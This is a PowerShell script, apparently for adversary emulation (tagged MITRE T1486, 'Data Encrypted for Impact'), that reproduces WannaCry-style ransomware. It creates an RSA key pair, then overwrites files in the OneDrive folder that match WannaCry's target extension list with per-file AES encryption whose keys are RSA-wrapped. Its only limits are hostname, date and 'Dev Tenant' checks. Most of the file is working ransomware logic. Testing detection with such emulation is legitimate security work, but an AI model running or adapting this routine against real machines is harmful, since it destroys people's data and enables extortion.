<#
.SYNOPSIS
Encrypt all files in Documents folder using asymmetric encryption, based on WannaCry behaviour (https://github.com/xcp3r/WannaCry) 

.DESCRIPTION
TA0040: Impact
T1486: Data Encrypted for Impact
1st attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq use-openssl | Remove-Module
Import-Module ../APIs/use-openssl.psm1
Get-Module | Where-Object name -eq use-powershell-aes | Remove-Module
Import-Module ../APIs/use-powershell-aes.psm1

$openssl = Get-OpenSSLPath
$temppass = Get-Random

Invoke-Expression "& `"$openssl`" genrsa -aes128 -out 00000000.eky -passout pass:$temppass 2048"
Invoke-Expression "& `"$openssl`" rsa -in 00000000.eky -passin pass:$temppass -pubout -out 00000000.pky"

Import-PsAES

# Protection against running it on the wrong machine or after one has forgotten what the script does
if ($env:COMPUTERNAME -ne "2024-QUBES-WIND" -and (Get-Date) -ge "2024-09-01") {
  Write-Error "THIS SCRIPT WILL ENCRYPT DATA! Please update ./runOnPremises.ps1 to include today's date and your hostname `"${env:COMPUTERNAME}`" if you would like to get rid of your OneDrive folder"
  exit 1
}

# Protection against running on real OneDrive
$oneDrivePath = $env:OneDriveCommercial.Split(";")[0]
if ($oneDrivePath -notlike "*Dev Tenant") {
  Write-Error "$oneDrivePath is not a Dev Tenant, not encrypting data"
  exit 1
}

$wannaCryExtensions = ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"

$files = Get-ChildItem $oneDrivePath
foreach ($file in $files) {
  # We only encrypt files that have certain extensions
  $path = $file.FullName
  if ($file.Extension -notin $wannaCryExtensions) {
    Write-Host "Skipping $path, because ${file.Extension} is not allowed"
    continue
  }

  $key = New-AesKey -KeySize 128
  $encryptedFile = Protect-AesFile -InFile $path -KeyString $key.Key -IvString $key.IV -Salt $key.Salt

  # The file is stored as rsaenc(key)|rsaenc(IV)|aesenc(content)
  # We also do this, because it makes the file marginally bigger so it matters for the logs
  $encKey = Invoke-Expression "echo `"$($key.Key)`" | & `"$openssl`" pkeyutl -encrypt -pubin -inkey 00000000.pky"
  $encIV = Invoke-Expression "echo `"$($key.IV)`" | & `"$openssl`" pkeyutl -encrypt -pubin -inkey 00000000.pky"
  Write-Host "echo `"$($key.IV)`" | & `"$openssl`" pkeyutl -encrypt -pubin -inkey 00000000.pky"

  $encKey + $encIV + $encryptedFile | Set-Content "$path"
  Write-Host "Encrypting $file"
}

